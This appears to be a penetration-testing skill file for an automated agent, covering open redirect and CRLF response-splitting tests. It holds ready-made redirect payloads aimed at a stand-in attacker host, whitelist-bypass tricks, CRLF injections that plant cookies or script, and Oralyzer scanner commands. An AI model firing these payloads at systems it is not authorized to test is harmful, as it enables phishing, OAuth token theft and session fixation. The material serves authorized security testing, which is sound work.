---
name: open-redirect-testing
license: Apache-2.0
description: Open redirect and CRLF/response-splitting testing (CWE-601/CWE-113, WSTG-CLNT-04/WSTG-INPV-15) — enumerate redirect/return/next/url parameters, fire absolute/scheme-relative/backslash/@-trick/whitelist-bypass payloads, distinguish header (302 Location) vs JavaScript vs meta-refresh redirects, inject %0d%0a to split responses and set headers/cookies, drive Oralyzer and normalize its JSON; use on any parameter that controls where the user is sent after an action.
metadata:
  author: Section9Labs
---

# Open Redirect & CRLF Testing

Covers CWE-601 (URL redirection to untrusted site, WSTG-CLNT-04) and CWE-113
(CRLF injection / HTTP response splitting, WSTG-INPV-15), which share the same
sink: a parameter reflected into `Location:` or client-side navigation. Every
parse/handoff step ends in rupu output — shapes in `references/rupu.md`.

## 1. Collect candidate parameters

Prime suspects: `redirect, redirect_uri, redirect_url, url, u, r, next, return,
returnUrl, return_to, returnTo, dest, destination, continue, goto, go, target, to,
out, view, link, login_url, logout, forward, callback, checkout_url, image_url,
page, back, backurl, ref, success_url, fail_url`.

Where they live: login/logout flows (`/login?next=`), OAuth/SSO (`redirect_uri` —
an open redirect there chains to token theft), language/locale switchers, tracking
`/out?url=` click-through endpoints, payment return URLs.

Harvest from crawl output (gau/katana/waybackurls/mitmproxy capture), filter, and
emit the fan-out array:

```
grep -Ei '[?&](redirect|redirect_ur[il]|url|u|r|next|return|returnurl|return_to|dest|destination|continue|goto|go|target|to|out|view|link|forward|callback|back|ref)=' urls.txt > redirect-candidates.txt
python3 scripts/parse_oralyzer.py --candidates redirect-candidates.txt --work-units redirect-units.json
```

Hand `redirect-units.json` to the `work-units` skill for `for_each:`/dispatch
fan-out; `assets.mark` each candidate as `web:route` depth `mapped`/`crawled`.

## 2. Payloads and manual confirmation

Full table in `references/payloads.md`. The core progression per parameter:

1. Baseline: `?next=/account` — does the param control navigation at all?
2. Absolute: `?next=https://evil.example.net/` — follow with `curl -skI` and read
   `Location:`.
3. Scheme-relative: `//evil.example.net`, `//evil.example.net/%2F..`
4. Parser tricks: `/\evil.example.net`, `\/\/evil.example.net`, `https:/evil.example.net`
   (one slash), `https:evil.example.net`.
5. Whitelist bypass when `example.com` is required:
   `https://example.com@evil.example.net/`, `https://example.com.evil.example.net/`,
   `https://evil.example.net/example.com`, `https://evil.example.net?example.com`,
   `https://evil.example.net#example.com`, `https://examplexcom.evil.example.net`
   (unescaped-dot regex).
6. Encoding: `%2F%2Fevil.example.net`, double-encode, `%E3%80%82` (ideographic
   full stop as dot), `%09`/`%00` splices, `///evil.example.net`.
7. `javascript:alert(document.domain)` — if accepted in a client-side redirect,
   the finding is XSS, not just redirect.

Classify the redirect mechanism (changes exploitability and the evidence you capture):

- **Header**: `30x` + `Location: https://evil.example.net/` — strongest; works with
  zero user interaction. Evidence = the raw response status + Location header.
- **JavaScript**: 200 OK, payload lands in `location.href=...`, `window.location=`,
  `location.replace(...)` — check whether you can break out of the string (then it
  is DOM XSS). Evidence = the reflected JS snippet.
- **Meta refresh**: `<meta http-equiv="refresh" content="0;url=https://evil...">`.
  Evidence = the reflected tag.

## 3. CRLF injection / response splitting

Same candidate params plus anything reflected into *any* response header. Inject
`%0d%0a` after a valid-looking value:

```
?next=/account%0d%0aSet-Cookie:%20crlf=injected
?next=/account%0d%0aX-Injected:%20vulture
?next=%0d%0a%0d%0a<script>alert(document.domain)</script>   (full body split -> XSS)
```

Confirm with `curl -skI` (or `curl -sk -D -`): a `Set-Cookie: crlf=injected` or
`X-Injected` header appearing in the response proves CWE-113. Impact chain:
session fixation via attacker-set cookies, cache poisoning, security-header
stripping, reflected XSS via body injection. Encoding variants (`%0d`, `%0a`,
`%0d%0a`, `%E5%98%8D%E5%98%8A` UTF-8 trick for some stacks, `%250d%250a` double)
in `references/payloads.md`.

## 4. Oralyzer

Flag reference in `references/oralyzer.md`. Core runs:

```
oralyzer -u "https://example.com/login?next=" -o oralyzer.json
oralyzer -l redirect-candidates.txt -p payloads.txt -o oralyzer.json --workers 10
oralyzer -u "https://example.com/login?next=" -crlf          # CRLF/response-splitting mode (single dash)
oralyzer -u "https://example.com/" --discover                # wayback param discovery
oralyzer -l targets.txt --filter header                      # only header-based results
```

Oralyzer labels each hit header / javascript / meta / crlf — keep that label, it
feeds severity and the PoC style. Re-verify every hit manually with `curl -skI`
before reporting (Oralyzer, like all redirect scanners, can false-positive on
soft-404 pages that echo the payload).

## 5. Parse, record, hand off

```
python3 scripts/parse_oralyzer.py -i oralyzer.json --confirmed confirmed.txt \
  -o merged.json --work-units units.json --findings findings.json
```

- `merged.json`: normalized `{url, param, payload, type}` records.
- `units.json`: work-units array for follow-up fan-out (e.g. a child per JS-redirect
  hit to test for DOM-XSS escalation) — route through the `work-units` skill.
- `findings.json`: one `findings.report` payload per verified hit — scope
  `endpoint`, `target_ref` = affected URL, severity medium (open redirect) /
  high (CRLF with header injection), CWE-601 or CWE-113 + WSTG id, evidence =
  request + the `302/Location` or split response. Submit each through the
  `finding-report` skill, and `assets.mark` the route `tested` (clean) or
  `exploited` (confirmed). Exact JSON shapes: `references/rupu.md`.

Escalation notes for the writeup: open redirect on `redirect_uri` of an OAuth
flow = token/code leak (raise to high); redirect + CRLF = cookie planting on the
real domain; redirect accepted by an SSRF-prone fetcher = SSRF filter bypass
(cross-link the `ssrf-testing` skill's finding).
